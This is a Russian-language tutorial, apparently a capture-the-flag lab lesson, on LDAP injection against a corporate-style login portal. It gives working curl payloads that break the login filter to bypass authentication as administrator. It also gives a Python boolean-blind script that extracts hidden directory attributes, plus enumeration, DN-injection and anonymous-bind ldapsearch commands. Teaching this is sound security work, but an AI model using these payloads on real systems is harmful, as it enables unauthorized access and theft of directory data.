## Задача

Ты нашёл корпоративный портал `portal.corp.local`. За ним — вход в почту, VPN и внутренние сервисы. Пароля у тебя нет. Но форма входа, скорее всего, проверяет тебя не по базе данных, а по **каталогу** — это служба, где хранятся учётные записи сотрудников (в мире Windows её роль играет Active Directory). Такие каталоги опрашивают языком **LDAP** — набором фильтров вида `(&(uid=alice)(userPassword=...)`).

Наша цель — зайти на портал без пароля и, если получится, вытащить из каталога что-то ценное. В этом уроке мы пройдём весь путь на одном живом примере.

## Данные, с которыми работаем

Откроем форму и посмотрим, как приложение строит запрос. В исходниках портала (или по ошибке) виден фильтр:

```java
String filter = "(&(uid=" + user + ")(userPassword=" + pass + "))";
```

Читаем по-человечески. **LDAP-фильтр** — это логическое выражение в скобках. `(uid=alice)` значит «атрибут `uid` равен `alice`». `&` — логическое И, `|` — ИЛИ, `!` — НЕ. Значит, приложение ищет запись, где `uid` совпал с логином **и** `userPassword` — с паролем.

Опасность прямо в коде: ввод `user` и `pass` **склеен** со строкой фильтра. Мы можем дописать свои скобки и операторы и сломать логику. Это и есть **LDAP-инъекция**.

Сделаем первый безобидный запрос — войдём с заведомо неверными данными, чтобы увидеть поведение:

```bash
$ curl -s -X POST https://portal.corp.local/login \
    --data-urlencode 'username=alice' --data-urlencode 'password=wrong'
{"error":"invalid credentials"}
```

Ответ — «неверные данные». Теперь ищем, где приложение не экранирует спецсимволы.

## Пробуем в лоб

Первый быстрый тест — **звёздочка** `*`. В LDAP это wildcard, «любая строка». Если фильтр собирается конкатенацией, `*` попадёт в него как есть и совпадёт с любым значением.

```bash
$ curl -s -X POST https://portal.corp.local/login \
    --data-urlencode 'username=*' --data-urlencode 'password=x'
{"error":"invalid password"}
```

Смотри на текст ошибки: было «invalid credentials» (общее), а стало «invalid password» (конкретное). Это значит, что фильтр по `uid=*` **сработал** — пользователь нашёлся, и ошибка перешла к проверке пароля. Значит, `*` не экранируется. Инъекция есть.

Правильная защита вычищает из ввода пять символов: `*`, `(`, `)`, `\` и нулевой байт. Раз `*` прошёл — защиты нет.

## Приём: ломаем фильтр и обходим пароль

Идея: закрыть условие `uid=` раньше времени и дописать своё — всегда истинное — условие. Разберём payload по кусочкам:

```text
*)(uid=*))(|(uid=*
```

- `*` — чтобы `uid=` совпал хоть с чем-то;
- `)` — закрывает `(uid=*`;
- `(uid=*)` — добавляем второе истинное условие;
- `))` — закрываем вложенные скобки;
- `(|(uid=*)` — открываем ветку ИЛИ, которая делает всё выражение истинным.

Подставим в фильтр — он превращается в `(&(uid=*)(uid=*))(|(uid=*)(userPassword=x))`. Из-за ветки `|` всё выражение истинно, и проверка пароля обходится. Проверяем:

```bash
$ curl -s -X POST https://portal.corp.local/login \
    --data-urlencode 'username=*)(uid=*))(|(uid=*' \
    --data-urlencode 'password=x' -c cookies.txt
{"ok":true,"user":"admin","role":"administrator"}
```

Мы вошли. `-c cookies.txt` сохранил сессионную куку — портал выдал её, не проверив пароль. Это уже **обход аутентификации**, критичная находка.

Но это только вход. Теперь хочется понять, что ещё лежит в каталоге.

## Слепое извлечение: подбираем атрибут по буквам

Портал отвечает «ok» или «invalid» — то есть даёт нам булев сигнал «условие истинно/ложно». Этого достаточно, чтобы вытянуть **любое** значение каталога, даже если оно не показывается. Приём называется **boolean-blind**: мы заставляем фильтр отвечать «да/нет» на вопрос «начинается ли `description` у admin на `flag`?».

Механика такая. Если послать в `username`:

```text
admin)(description=flag{*
```

фильтр станет `(&(uid=admin)(description=flag{*)(userPassword=x))` — то есть «есть ли admin, у которого `description` начинается на `flag{`». Если да — придёт «ok», если нет — «invalid». Значит, посимвольно подбирая префикс, мы читаем значение.

Сначала найдём длину и убедимся, что атрибут вообще есть. Атрибут `description` — свободное текстовое поле, в корпоративных каталогах туда часто пишут служебные пометки.

```bash
$ curl -s -X POST https://portal.corp.local/login \
    --data-urlencode 'username=admin)(description=*' --data-urlencode 'password=x'
{"ok":true}
```

Есть. Теперь скрипт-оракул подбирает значение буква за буквой:

```python
import requests, string
URL = "https://portal.corp.local/login"
def found(cond):
    r = requests.post(URL, data={"username": f"admin)({cond}", "password": "x"})
    return '"ok":true' in r.text

val = ""
for i in range(1, 80):
    for c in string.ascii_letters + string.digits + "{}_-@.":
        if found(f"description={val}{c}*"):
            val += c; print(val); break
    else:
        break
print("attr:", val)
```

Прогон печатает значение по шагам — `f`, `fl`, `fla`, `flag`, `flag{`, и так до закрывающей скобки. Когда ни одна буква не подошла — строка кончилась:

```text
attr: flag{ld4p_1nj3ct10n}
```

Флаг вытащен. Обрати внимание: значение **не отражалось** на странице — мы восстановили его из одного бита информации «да/нет». Тот же оракул читает `mail`, `memberOf` и любые другие атрибуты.

## Полный прогон от начала до конца

Соберём историю целиком:

1. `password=wrong` → «invalid credentials» — базовое поведение.
2. `username=*` → «invalid password» — wildcard не экранируется, инъекция подтверждена.
3. `username=*)(uid=*))(|(uid=*` → `{"ok":true,"role":"administrator"}` — пароль обойдён, мы в админке.
4. `username=admin)(description=*` → `{"ok":true}` — атрибут существует.
5. Скрипт-оракул → `flag{ld4p_1nj3ct10n}`.

Один живой пример провёл нас от пустого логина до данных каталога. Все находки (обход логина, прочитанный атрибут) фиксируем как артефакт.

## Если не сработало

- **Wildcard экранируется.** Тогда фильтр собирают правильно — пробуй `username=admin)(&)` (закрыть условие и добавить пустое И, оно истинно) или инъекцию в **DN** (bind DN): если приложение строит `cn=USER,ou=users`, подставь `cn=admin,ou=admins,dc=corp`.
- **Java-приложение с `InitialContext.lookup`.** Ввод может уходить не в фильтр, а в JNDI-поиск (`ldap://...`). Это уже путь к RCE — смотри урок `web-log4shell-jndi`.
- **Нужен только вход, а портал отдаёт список.** Проверь `username=a*`, `b*` — так перечисляются пользователи (enumeration), и это самостоятельная находка.
- **Анонимный bind разрешён.** Попробуй `ldapsearch -x -H ldap://portal.corp.local:389 -b 'dc=corp,dc=local' '(objectClass=user)' cn mail` — каталог может отдавать данные вообще без пароля.

## На что смотреть дальше

- **Всегда начинай с `*`.** Это самый быстрый тест: прошёл — фильтр не экранирует, и дальше дело техники.
- **Читай текст ошибок.** Разница «invalid user» и «invalid password» — готовый оракул.
- **Три входа, а не один:** фильтр логина, bind DN и JNDI-lookup. Инъекция может прятаться в любом.
- **Экранирование проверяй целиком.** Если защита убрала `*`, но оставила `(`, атака всё ещё возможна.
- **Не ломай прод.** Обход логина и слепое чтение атрибутов — это чтение; никаких удалений/изменений каталога.
- **Фиксируй артефакт-оракул.** Скрипт подбора пригодится и на других LDAP-эндпоинтах.
